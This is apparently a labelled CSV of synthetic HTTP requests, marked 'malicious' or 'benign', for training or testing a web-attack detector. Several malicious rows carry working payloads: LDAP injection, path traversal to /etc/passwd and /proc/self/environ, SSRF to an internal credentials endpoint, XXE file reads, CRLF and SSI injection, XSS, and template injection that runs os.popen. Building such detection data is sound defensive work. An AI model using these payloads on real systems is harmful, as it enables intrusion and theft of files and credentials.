label,text
malicious,"POST /ldapsearch HTTP/1.1
Host: corporate-ldap-gateway.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"GET /shop/cart?cmd=view_details&session=2a3d5e7f HTTP/1.1
Host: online-retail-store.biz
Accept: text/html
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: sessionID=2a3d5e7f; userPref=darkMode%3Dfalse
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Referer: https://online-retail-store.biz/shop/products/electronics"
benign,"GET /search HTTP/1.1
Host: urban-fashion-hub.io
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://urban-fashion-hub.io/
Connection: close"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: user-preferences-service.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: application/json-patch+json
Content-Length: 59
Authorization: Bearer a9f3d8e0-2bb4-429c-9f53-429d18a3521a
Accept: application/json
Connection: keep-alive

[{ ""op"": ""replace"", ""path"": ""/notifications/email"", ""value"": false }]"
benign,"POST /v1/device/configure HTTP/1.1
Host: smart-home-central.io
Authorization: Bearer NMxDL4sqRQ7Pwl09adZG1737fjpXUvH8Et1oK9ReU
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.2
Content-Length: 125
Connection: keep-alive

{""device.config.mode"":""auto"",""settings['temperature_threshold']"":22.5,""schedule.days-active"":[""mon"",""wed"",""fri""],""user-preferences['alerts_enabled']"":true}"
malicious,"GET /document?template=../../../../../../../../etc/passwd HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /find?search_term=how+to+bake+bread+with+whole+grain HTTP/1.1
Host: urban-cookery-tips.org
Accept: text/html
Referer: https://urban-cookery-tips.org/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Cache-Control: no-cache"
benign,"GET /search?q=books&comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: python-requests/2.28.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive"
benign,"GET /static/v3/content/articles/hero-banner-escaped-forest-650x400.jpg HTTP/1.1
Host: my-personal-blog-site.info
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://my-personal-blog-site.info/articles/nature-adventures
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"GET /fonts/proxima-nova-semibold.ttf HTTP/1.1
Host: tech-news-hub.online
Connection: keep-alive
Accept: application/font-ttf,*/*;q=0.7
Referer: https://tech-news-hub.online/css/article-style.css
Origin: https://tech-news-hub.online
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"POST /api/media/upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: multipart/form-data; boundary=--MIME_boundary_466
Accept: */*
Origin: https://community.game-dev-forum.org
X-Requested-With: XMLHttpRequest

----MIME_boundary_466
Content-Disposition: form-data; name=""file""; filename=""game-play-log.txt""
Content-Type: text/plain

Duration: 45 minutes
Final score: top 10
This is a safe upload.
----MIME_boundary_466--"
malicious,"GET /content/fetch?url=http://vault.internal.corp:8000/admin/credentials HTTP/1.1
Host: mediafile-storage-center.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: close"
benign,"GET /api/v1/maps/tiles/region42/zoom12/15/20.png HTTP/1.1
Host: geo-map-api.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Range: bytes=0-1023
Accept-Language: en
Via: 1.1 varnish
Connection: keep-alive"
benign,"POST /blog/comment/add HTTP/1.1
Host: tech-insider-community.dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Length: 148
Referer: https://tech-insider-community.dev-forum.org/blog/article/view/876
Connection: keep-alive
Cookie: session_id=f3e9a047b0a349a8b6ff77e3f1b9abe9

<comment>
  <author>mike_trent</author>
  <postId>876</postId>
  <content>Great insights on the latest GPU releases!</content>
</comment>"
benign,"GET /articles/travel-tips-europe HTTP/1.1
Host: globe-trotters-journal.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Connection: close"
benign,"GET /favicon.ico HTTP/1.1
Host: smart-home-automation.dev
Accept: image/x-icon,image/vnd.microsoft.icon,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Connection: keep-alive
DNT: 1"
benign,"POST /api/v2/inventory/items HTTP/1.1
Host: warehousenet.biz
Authorization: Bearer X87upZ4dsvPlMHy9oo1rXVeB
Content-Type: application/json
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Content-Length: 102
Connection: close

{""sku"":""WSH-4567"",""name"":""Ergonomic Office Chair"",""quantity"":35,""price"":129.99,""category"":""furniture""}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: application/json
Accept-Encoding: deflate, gzip
Content-Type: application/json
Content-Length: 65
Cookie: lang_pref=../../../../var/log/auth.log%00default; sid=fa6472863ae42381

{""searchTerm"":""laptop"",""filters"":{""category"":""electronics"",""priceRange"":""100-1000""}}"
benign,"DELETE /api/v1/users/98213 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.def456
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"POST /posts/comment/create HTTP/1.1
Host: tech-insights-journal.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://tech-insights-journal.com/posts/456

comment=Is+it+built+into+the+browser+to+recognize+the+%3Ca+onclick%3D%22alert('hello')%3B%22%3Eanchor+tags%3C%2Fa%3E+with+JavaScript+event+handlers+like+onClick%3F"
benign,"POST /user/accounts/password/reset HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close
Content-Length: 56

{""email"":""jacob.sanders1984@online-retail-store.biz""}"
malicious,"GET /dashboard HTTP/1.1
Host: enterprise-cloud-solutions.io
X-Forwarded-For: 10.0.0.1%0d%0aInjected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/92.0.4515.159%20Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5"
malicious,"GET /app/media?image=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afproc%c0%afself%c0%afenviron HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/shop/cart
Connection: keep-alive"
malicious,"OPTIONS /services/form-process HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/93.0.4577.82 Chrome/93.0.4577.82 Safari/537.36
X-Dynamic-Render: <!--#config errmsg=""SSI_Error_Triggered_Successfully""-->
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"GET /api/v1/store/inventory/status?store_id=27 HTTP/1.1
Host: inventory-management-solutions.biz
Accept: application/json
Authorization: Token 4f12c4397d2eab5c617a987a3c586f0b
Origin: https://portal.inventory-management-solutions.biz
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36"
benign,"GET /blog/posts?title=exploring+the+history+and+cultures+of+the+mediterranean+coastlines+and+their+influence+on+modern+seafood+cuisine HTTP/1.1
Host: coastal-tales.info
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"GET /api/v1/account/status HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /api/v3/xml/submitOrder HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Content-Type: application/xml
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Length: 218

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE data [
  <!ELEMENT data ANY >
  <!ENTITY p SYSTEM ""file:///etc/passwd"" >
]>
<data>
  <userToken>&p;</userToken>
  <priority>high</priority>
</data>"
benign,"GET /listings/travel/deals?filter[country]=japan&sort_by=price_asc&page=2 HTTP/1.1
Host: globe-trotters-travel.ai
Accept: text/html
Referer: https://globe-trotters-travel.ai/listings/travel
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.142 Mobile Safari/537.36
Connection: keep-alive"
malicious,"GET /user/profile/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
X-Security-Override: true
Connection: keep-alive"
benign,"POST /auth/forgot_password HTTP/1.1
Host: edu-resource-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: en-CA,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Origin: https://edu-resource-platform.net
Referer: https://edu-resource-platform.net/login

email=caroline.thomas%40eduplatform.net"
benign,"POST /api/v1/orders/create HTTP/1.1
Host: marketplace-global-exchange.net
Content-Type: application/json
Authorization: Bearer u98irq8ru32jer98u230rnf0swen
Idempotency-Key: f1b8cc17-c84b-4104-a44b-3b1a5fa7a305
X-Request-ID: 2e541a1d-2f83-45bc-bd4f-f4e7ee3a3b39
X-Client-Version: 2.6.9
Cache-Control: no-cache
Accept: application/json
Connection: keep-alive
User-Agent: python-requests/2.31.0

{
  ""order"": {
    ""product_id"": ""PRD-657398"",
    ""quantity"": 3,
    ""payment_method"": ""wallet""
  },
  ""shipping"": {
    ""address"": ""742 Evergreen Terrace, Springfield"",
    ""priority"": ""express""
  }
}"
benign,"GET /admin/settings?filter[type]=admin&filter[active]=true HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Cookie: session_id=7d84cf2608f4d3bdc1a6b179d4ce59bf; user_pref=darkmode=true
Upgrade-Insecure-Requests: 1"
malicious,"POST /api/v2/submit/feedback HTTP/1.1
Host: outreach-campaigns-service.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Length: 183
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://10.0.1.5:8080/status"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"DELETE /api/v1/subscriptions/ee11-bb22-cc33 HTTP/1.1
Host: payment-gateway-services.co.uk
Authorization: Bearer 9876543210poiuytrewqlkjhgfdsamnbvcxz
X-Confirm-Delete: true
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
X-Forwarded-For: 66.249.66.1
Connection: keep-alive"
malicious,"POST /checkout/process HTTP/1.1
Host: fake-payment-gateway.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 47
Origin: https://www.online-retail-store.biz

card_number=4111111111111111&expiry=12%2F25&cvv=123"
benign,"POST /community/post/new HTTP/1.1
Host: radiant-artisan-marketplace.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 2465
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://radiant-artisan-marketplace.com/community/forums

title=Handcrafted+Pottery+Care+Tips&body=Pottery+made+by+hand+holds+a+unique+place+in+any+home+due+to+its+charm+and+character.+To+ensure+that+your+handcrafted+pottery+lasts+for+generations%2C+it%27s+important+to+follow+some+basic+care+rules.+Firstly%2C+avoid+putting+your+pottery+in+the+dishwasher+as+the+heat+and+detergents+can+damage+the+glaze+and+clay.+Instead%2C+wash+by+hand+with+mild+soap+and+lukewarm+water.+Secondly%2C+try+to+avoid+rapid+temperature+changes+which+can+cause+cracks.+For+example%2C+don%27t+place+a+cold+pottery+piece+directly+into+a+hot+oven.+Thirdly%2C+if+stains+occur%2C+natural+cleaners+like+baking+soda+can+work+well+without+damaging+the+artwork.+Lastly%2C+display+pottery+out+of+direct+sunlight+to+prevent+fading+over+time.+Following+these+steps+will+help+your+handmade+pieces+stay+beautiful+and+functional+for+many+years."
benign,"GET /api/v1/weather/current?city=Santorini HTTP/1.1
Host: weather-forecast-service.cloud
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.gJvtymUcPCDQYb-
Origin: https://weather-forecast-service.cloud
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
malicious,"POST /v2/auth/redirect HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Cache-Control: no-cache
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"GET /dashboard/custom_page?greeting=%7B%7B%207*%277%27%20%7D%7D HTTP/1.1
Host: user-content-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://user-content-portal.net/home
Connection: keep-alive"
malicious,"GET /search/filter/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/proc/cpuinfo%27).read()%20%7D%7D/results HTTP/1.1
Host: analytics-data-pool.tools
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /profile/contact HTTP/1.1
Host: user-networking-hub.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive

email=contact%40newuser.net&phone=&preferred_contact=email"
benign,"POST /account/login HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Referer: https://online-retail-store.biz/account/login
Origin: https://online-retail-store.biz
Cookie: user_session=V7OhxqLDcnqS9LR9; csrf_token=7b11c46d6cba41a9
User-Agent: curl/7.85.0
Upgrade-Insecure-Requests: 1
Accept: */*
Connection: keep-alive

email=jessica.willis%40shopmail.biz&password=BlueSky#1982"
benign,"GET /management/accounts?filter[type]=admin&filter[active]=true HTTP/1.1
Host: my-company-admin.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
X-CSRF-Token: 5f9d8b4e26f4a1c3a7b7e77d622f420f
Referer: https://my-company-admin.org/login"
benign,"GET /search/results?query=how%20to%20bake%20bread HTTP/1.1
Host: baking-delights.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://baking-delights.org/home
Upgrade-Insecure-Requests: 1"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept: application/json, text/plain, */*
Content-Type: application/json-patch+json
Content-Length: 104
Cookie: sessionID=ae8d3bc1f6e84a809f221be28f2339a3; lang=en-US
Referer: https://secure-user-portal.net/dashboard
Connection: close

[
  { ""op"": ""add"", ""path"": ""/preferences/theme"", ""value"": ""dark"" },
  { ""op"": ""replace"", ""path"": ""/preferences/fontSize"", ""value"": ""medium"" }
]"
